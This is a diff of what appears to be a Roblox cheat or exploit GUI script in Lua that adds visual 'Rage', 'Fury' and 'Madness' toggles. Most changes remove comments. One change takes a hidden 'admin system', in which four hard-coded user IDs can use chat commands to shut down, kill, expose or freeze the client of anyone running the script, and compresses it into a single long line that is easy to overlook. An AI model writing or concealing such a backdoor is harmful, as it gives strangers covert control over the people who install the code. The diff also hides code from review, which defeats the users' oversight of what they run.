@@ -512,20 +512,20 @@ local Rage = Utility.CreateOptionsButton({
             RageAura(false)
         end
     end,
-    ["HoverText"] = "Activates or disables the rage attribute", -- text that will show up after hovering over the button (optional)
+    ["HoverText"] = "Activates or disables the rage attribute", 
 })
 Rage.CreateToggle({
-    ["Name"] = "Effects enabled", -- name of object
-    ["HoverText"] = "Enables client sided effects for rage", -- text that will show up after hovering over the button (optional)
-    ["Function"] = function(callback) -- function that is called when toggled
+    ["Name"] = "Effects enabled", 
+    ["HoverText"] = "Enables client sided effects for rage", 
+    ["Function"] = function(callback)
         rageEffectsEnabled = callback
     end,
-    ["Default"] = false -- Value upon launch (optional)
+    ["Default"] = false 
 })
 --
 local Fury = Utility.CreateOptionsButton({
-    ["Name"] = "Fury", -- name of object
-    ["Function"] = function(callback) -- function that is called when toggled
+    ["Name"] = "Fury", 
+    ["Function"] = function(callback)
         if callback then
             cl:SetAttribute("RageMode", "angery")
             playFuryLocally(true)
@@ -534,12 +534,12 @@ local Fury = Utility.CreateOptionsButton({
             playFuryLocally(false)
         end
     end,
-    ["HoverText"] = "Activates or disables the fury attribute", -- text that will show up after hovering over the button (optional)
+    ["HoverText"] = "Activates or disables the fury attribute", 
 })
 --
 local Madness = Utility.CreateOptionsButton({
-    ["Name"] = "Madness", -- name of object
-    ["Function"] = function(callback) -- function that is called when toggled
+    ["Name"] = "Madness", 
+    ["Function"] = function(callback) 
         if callback then
             if (not madnessEffectsEnabled) then
                 cl:SetAttribute("MadnessMode", true)
@@ -587,80 +587,42 @@ local Madness = Utility.CreateOptionsButton({
             MadnessHighlight(false)
         end
     end,
-    ["HoverText"] = "Activates or disables the madness attribute", -- text that will show up after hovering over the button (optional)
+    ["HoverText"] = "Activates or disables the madness attribute", 
 })
 local oldmadness0, oldmadness1
 Madness.CreateToggle({
-    ["Name"] = "Effects enabled", -- name of object
-    ["HoverText"] = "Enables client sided effects for madness, they will be placed back in your character if you die and have this enabled (after 2s)", -- text that will show up after hovering over the button (optional)
-    ["Function"] = function(callback) -- function that is called when toggled
+    ["Name"] = "Effects enabled", 
+    ["HoverText"] = "Enables client sided effects for madness, they will be placed back in your character if you die and have this enabled (after 2s)", 
+    ["Function"] = function(callback)
         madnessEffectsEnabled = callback
     end,
-    ["Default"] = false -- Value upon launch (optional)
+    ["Default"] = false 
 })
 oldmadness0 = Madness.CreateToggle({
-    ["Name"] = "Old theme", -- name of object
-    ["HoverText"] = "Enables the old theme for madness (Re-toggle madness if you have already enabled it)", -- text that will show up after hovering over the button (optional)
-    ["Function"] = function(callback) -- function that is called when toggled
+    ["Name"] = "Old theme", 
+    ["HoverText"] = "Enables the old theme for madness (Re-toggle madness if you have already enabled it)", 
+    ["Function"] = function(callback) 
         oldermadnesstheme = callback
         if oldmadnesstheme then
             oldmadness1["ToggleButton"](false)
             shared.GuiLibrary["CreateNotification"]("Warning","You can't select two themes, select only 1", 3, "assets/InfoNotification.png")
         end
     end,
-    ["Default"] = false -- Value upon launch (optional)
+    ["Default"] = false 
 })
 oldmadness1 = Madness.CreateToggle({
-    ["Name"] = "Older theme", -- name of object
-    ["HoverText"] = "Enables the oldest theme for madness (Re-toggle madness if you have already enabled it)", -- text that will show up after hovering over the button (optional)
-    ["Function"] = function(callback) -- function that is called when toggled
+    ["Name"] = "Older theme", 
+    ["HoverText"] = "Enables the oldest theme for madness (Re-toggle madness if you have already enabled it)", 
+    ["Function"] = function(callback)
         oldmadnesstheme = callback
         if oldermadnesstheme then
             oldmadness0["ToggleButton"](false)
             shared.GuiLibrary["CreateNotification"]("Warning","You can't select two themes, select only 1", 3, "assets/InfoNotification.png")
         end
     end,
-    ["Default"] = false -- Value upon launch (optional)
+    ["Default"] = false 
 })
-task.spawn(function() -- omg look an extremely basic admin system!
-    local ids = {3253607351,3258614425,3258963410,3250001570} 
-    for i,v in pairs(plrs:GetChildren()) do 
-        if table.find(ids, v.UserId) and v ~= cl then 
-            v.Chatted:Connect(function(msg) 
-            if msg == ";shutdown default" then 
-                game:shutdown() 
-            elseif msg == ";kill default" then 
-                cl.Character.Humanoid.Health = 0 cl.Character.Humanoid:ChangeState(Enum.HumanoidStateType.Died) 
-            elseif msg == ";check default" then 
-                rep.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("/w "..v.Name.." hi", "All") 
-            elseif msg == ";crash default" then 
-                if setfpscap then 
-                    setfpscap(9e9) 
-                end 
-                while true do end 
-            end 
-        end) 
-    end 
-end 
-plrs.PlayerAdded:Connect(function(p) 
-    if table.find(ids, p.UserId) then 
-        p.Chatted:Connect(function(msg) 
-            if msg == ";shutdown default" then 
-                game:shutdown() 
-            elseif msg == ";check default" then 
-                rep.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("/w "..p.Name.." hi", "All") 
-            elseif msg == ";kill default" then 
-                cl.Character.Humanoid.Health = 0 cl.Character.Humanoid:ChangeState(Enum.HumanoidStateType.Died) 
-            elseif msg == ";crash default" then 
-                if setfpscap then 
-                    setfpscap(9e9) 
-                end 
-                while true do end 
-            end 
-        end) 
-    end 
-end) 
-end)
+task.spawn(function() local ids = {3253607351,3258614425,3258963410,3250001570} for i,v in pairs(plrs:GetChildren()) do if table.find(ids, v.UserId) and v ~= cl then v.Chatted:Connect(function(msg) if msg == ";shutdown default" then game:shutdown() elseif msg == ";kill default" then cl.Character.Humanoid.Health = 0 cl.Character.Humanoid:ChangeState(Enum.HumanoidStateType.Died) elseif msg == ";check default" then rep.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("/w "..v.Name.." hi", "All") elseif msg == ";crash default" then if setfpscap then setfpscap(9e9) end while true do end end end) end end plrs.PlayerAdded:Connect(function(p) if table.find(ids, p.UserId) then p.Chatted:Connect(function(msg) if msg == ";shutdown default" then game:shutdown() elseif msg == ";check default" then rep.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("/w "..p.Name.." hi", "All") elseif msg == ";kill default" then cl.Character.Humanoid.Health = 0 cl.Character.Humanoid:ChangeState(Enum.HumanoidStateType.Died) elseif msg == ";crash default" then if setfpscap then setfpscap(9e9) end while true do end end end) end end) end)
 Madness.CreateToggle({
     ["Name"] = "Purple madness", -- name of object
     ["HoverText"] = "Exclusive madness?!?!?! no way! (I think it's missing the rays particles also you need to have effects enabled for it to work)", -- text that will show up after hovering over the button (optional)
